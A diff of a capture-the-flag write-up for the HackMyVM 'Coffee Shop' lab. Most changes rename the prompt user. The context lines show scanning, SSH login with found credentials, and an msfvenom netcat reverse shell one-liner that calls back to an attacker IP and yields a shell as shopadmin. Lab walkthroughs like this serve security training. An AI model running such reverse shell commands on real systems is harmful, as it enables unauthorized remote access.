@@ -5,14 +5,14 @@
 ### Arp Scan 
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo arp-scan -l | grep 97  
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo arp-scan -l | grep 97  
 192.168.0.175	08:00:27:2a:fe:97	PCS Systemtechnik GmbH
 ```
 
 ### Nmap Scan Results
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo nmap -p- -sV -sC 192.168.0.175 -oA nmap/coffeeshop.tcp
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo nmap -p- -sV -sC 192.168.0.175 -oA nmap/coffeeshop.tcp
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 17:44 BST
 Nmap scan report for 192.168.0.175
 Host is up (0.000079s latency).
@@ -36,13 +36,13 @@ Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds
 Adding `midnight.cofee` to the host file
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ echo '192.168.0.175 midnight.coffee' | sudo tee -a /etc/hosts
+garffff@garffff:~/hackmyvm/coffeeshop$ echo '192.168.0.175 midnight.coffee' | sudo tee -a /etc/hosts
 ```
 
 ### Directory Bruteforcing
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ fuf -u http://midnight.coffee/FUZZ -w /opt/SecLists/Discovery/Web-Content/big.txt 
+garffff@garffff:~/hackmyvm/coffeeshop$ fuf -u http://midnight.coffee/FUZZ -w /opt/SecLists/Discovery/Web-Content/big.txt 
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -80,7 +80,7 @@ Visiting the /shop directory, we come across a login page:
 A subdomain of `dev` is discovered:
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ ffuf -u http://midnight.coffee/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.midnight.coffee" -fs 1690
+garffff@garffff:~/hackmyvm/coffeeshop$ ffuf -u http://midnight.coffee/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.midnight.coffee" -fs 1690
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -136,7 +136,7 @@ tuna:1L0v3_TuN4_Very_Much
 These credentials work using SSH:
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ ssh tuna@midnight.coffee
+garffff@garffff:~/hackmyvm/coffeeshop$ ssh tuna@midnight.coffee
 The authenticity of host 'midnight.coffee (192.168.0.175)' can't be established.
 ED25519 key fingerprint is SHA256:BDdxu8eqrB8nO8JfJ3LfRnnT0gGHmaYMEIA1SfgIR6g.
 This key is not known by any other names
@@ -241,8 +241,7 @@ This is simply telling us that anything inside of the `/tmp` directory that has 
 I will created an msfvenom payload:
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=9999
-[sudo] password for gareth:            
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=9999         
 [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
@@ -253,7 +252,7 @@ mkfifo /tmp/kdiw; nc 192.168.0.51 9999 0</tmp/kdiw | /bin/sh >/tmp/kdiw 2>&1; rm
 Creating a reverse listener: 
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
 Listening on 0.0.0.0 9999
 ```
 
@@ -267,7 +266,7 @@ tuna@coffee-shop:~$ chmod +x /tmp/shell.sh
 After about a minute, a reverse shell is received as the user shopadmin:
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
 Listening on 0.0.0.0 9999
 Connection received on midnight.coffee 33696
 whoami
@@ -277,7 +276,7 @@ shopadmin
 Upgrading the to a fully interactive TTY connection:
 
 ```bash
-gareth@gareth:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
+garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
 Listening on 0.0.0.0 9999
 Connection received on midnight.coffee 33696
 
@@ -288,7 +287,7 @@ python3: /usr/bin/python3 /usr/lib/python3 /etc/python3 /usr/share/python3 /usr/
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 shopadmin@coffee-shop:~$ ^Z
 [1]+  Stopped                 sudo nc -lvp 9999
-gareth@gareth:~/hackmyvm/coffeeshop$ stty raw -echo
+garffff@garffff:~/hackmyvm/coffeeshop$ stty raw -echo
 sudo nc -lvp 9999ackmyvm/coffeeshop$ 
 
 
